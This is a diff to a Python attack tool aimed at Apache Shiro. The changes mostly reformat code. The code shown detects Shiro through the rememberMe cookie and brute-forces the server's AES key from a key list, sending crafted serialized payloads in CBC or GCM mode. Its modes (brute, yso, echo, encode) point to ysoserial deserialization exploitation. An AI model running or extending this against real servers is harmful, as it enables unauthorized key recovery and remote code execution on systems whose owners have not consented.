@@ -28,16 +28,16 @@ CHECK_DATA = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ2
 
 def check_shiro():
     request = requests.get(url, timeout=10, proxies=PROXY,
-                    verify=False, headers=HEADER, allow_redirects=False)
+                            verify=False, headers=HEADER, allow_redirects=False)
     
     if int(str(request.status_code)[0:1]) in [4,5]:
         print("[!] The target URL redirected or inaccessible!")
-        print("[!] The status code :" + str(request.status_code))
+        print("[!] The status code : {}".format(str(request.status_code)))
         exit()
 
     if data == None:
         request = requests.get(url, cookies={'rememberMe': "xxxx"}, timeout=10, proxies=PROXY,
-                            verify=False, headers=HEADER, allow_redirects=False)
+                                verify=False, headers=HEADER, allow_redirects=False)
         res_length = len(str(request.headers))
 
         if "rememberMe" in str(request.headers):
@@ -48,7 +48,7 @@ def check_shiro():
             exit()
     else:
         request = requests.post(url, cookies={'rememberMe': "xxxx"}, timeout=10, proxies=PROXY,
-            verify=False, headers=HEADER, allow_redirects=False,data=data)
+                                verify=False, headers=HEADER, allow_redirects=False,data=data)
         res_length = len(str(request.headers))
         if "rememberMe" in str(request.headers):
             print("[*] Shiro framework exists for the target!")
@@ -57,7 +57,7 @@ def check_shiro():
             print("[!] The Shiro framework may not exist for the target,maybe you can add '-d' argument and try again")
             exit()
 
-def brute_key(url, type, data, key=None):
+def brute_key(url, type, data=None, key=None):
     res_length = check_shiro()
     try:
         with open(os.path.join(sys.path[0], './lib/shiro_keys.txt'),'r') as fr:
@@ -72,11 +72,11 @@ def brute_key(url, type, data, key=None):
 
             if data != "":
                 r = requests.post(url, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
-                                verify=False, headers=HEADER, allow_redirects=False,data=data)
+                                    verify=False, headers=HEADER, allow_redirects=False,data=data)
                 rsp = len(str(r.headers))
             else:
                 r = requests.get(url, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
-                            verify=False, headers=HEADER,allow_redirects=False)
+                                    verify=False, headers=HEADER,allow_redirects=False)
                 rsp = len(str(r.headers))
 
             if res_length != rsp and r.status_code != 400:
@@ -136,11 +136,11 @@ if __name__ == '__main__':
     type = str.upper(args.type)
     data = args.data
 
-    if mode not in ['brute','yso','echo','encode']:
+    if mode not in ['brute', 'yso', 'echo', 'encode']:
         print("[!] Please check the mode,it must be brute/yso/echo/encode")
         exit()
 
-    if type!=None and type not in ['GCM','CBC']:
+    if type!= None and type not in ['GCM', 'CBC']:
         print("[!] Please check the type,it must be GCM or CBC")
         exit()
 
@@ -149,17 +149,17 @@ if __name__ == '__main__':
         exit()
 
     if mode == "brute" and url and type=="CBC":
-        print("[*] your mode : " + mode)
-        print("[*] Your url url : " + url)
-        print("[*] Your Cipher type : " + type)
+        print("[*] your mode : {0}".format(mode))
+        print("[*] Your url url : {0}".format(url))
+        print("[*] Your Cipher type : {0}".format(type))
         if brute_key(url, type, data) == False:
             print("[!] The current chiper type is CBC,you can add the '- t GCM' argument and run again")
             exit()
 
     if mode == "brute" and url and type=="GCM":
-        print("[*] your mode : " + mode)
-        print("[*] Your url url : " + url)
-        print("[*] Your Cipher type : " + type)
+        print("[*] your mode : {}".format(mode))
+        print("[*] Your url url : {0}".format(url))
+        print("[*] Your Cipher type : {0}".format(type))
         if brute_key(url, type, data) == False:
             print("[!] The current chiper type is GCM,you can add the '- t CBC' argument and run again")
             exit()
